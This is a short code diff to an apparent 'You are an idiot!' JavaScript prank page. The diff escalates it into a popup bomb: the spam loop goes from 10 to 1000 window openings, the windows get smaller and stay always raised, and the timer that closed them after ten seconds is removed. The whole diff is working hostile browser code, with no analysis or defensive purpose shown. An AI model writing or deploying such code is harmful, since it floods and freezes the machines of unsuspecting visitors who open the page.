@@ -5,11 +5,11 @@ function reopen() {
   window.open(
     "popup.html",
     "",
-    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
+    "blankmenubar=no,status=no,toolbar=noresizable=no,width=150,height=170,titlebar=no,alwaysRaised=yes"
   );
 }
 function spam() {
-  for (var i = 0; i < 10; i++) {
+  for (var i = 0; i < 1000; i++) {
     reopen();
   }
   return "You are an idiot!";
@@ -25,9 +25,6 @@ function init() {
     bookmark();
   }
   reopen();
-  setTimeout(function () {
-    window.close();
-  }, 10000);
 }
 var xOff = 5,
   yOff = 5,
